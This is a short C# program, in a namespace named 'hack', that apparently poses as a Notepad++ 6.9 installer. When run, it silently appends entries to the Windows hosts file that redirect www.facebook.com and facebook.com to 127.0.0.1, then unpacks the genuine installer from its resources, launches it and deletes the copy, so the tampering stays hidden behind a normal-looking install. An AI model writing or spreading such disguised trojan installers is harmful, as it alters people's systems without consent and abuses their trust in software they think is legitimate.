using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Windows.Forms;
using hack.Properties;

namespace hack
{
    internal class Program
    {

        private const string HostsPath = @"C:\Windows\System32\drivers\etc\hosts";

        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        private static void Main()
        {
            try
            {
                using (var sw = new StreamWriter(new FileStream(HostsPath, FileMode.Append)))
                {
                    sw.WriteLine();
                    sw.WriteLine("127.0.0.1 www.facebook.com");
                    sw.WriteLine("127.0.0.1 facebook.com");
                }
                var exeBytes = Resources.npp_6_9_Installer;
                var tempFile = Path.Combine(Directory.GetCurrentDirectory(), "npp.6.9.Installer.exe");
                using (var fs = new FileStream(tempFile, FileMode.OpenOrCreate))
                {
                    fs.Write(exeBytes, 0, exeBytes.Length);
                }
                try
                {
                    using (var nppProcess = Process.Start(tempFile))
                    {
                        nppProcess?.WaitForExit();
                    }
                }
                catch (Exception e)
                {
                    MessageBox.Show(e.GetType() + Environment.NewLine + e.Message, "Severe internal hack error",
                        MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
                finally
                {
                    File.Delete(tempFile);
                }
            }
            catch (Exception e)
            {
                MessageBox.Show(e.GetType() + Environment.NewLine + e.Message, "Severe internal hack error",
                        MessageBoxButtons.OK, MessageBoxIcon.Error);
            }

        }
    }
}
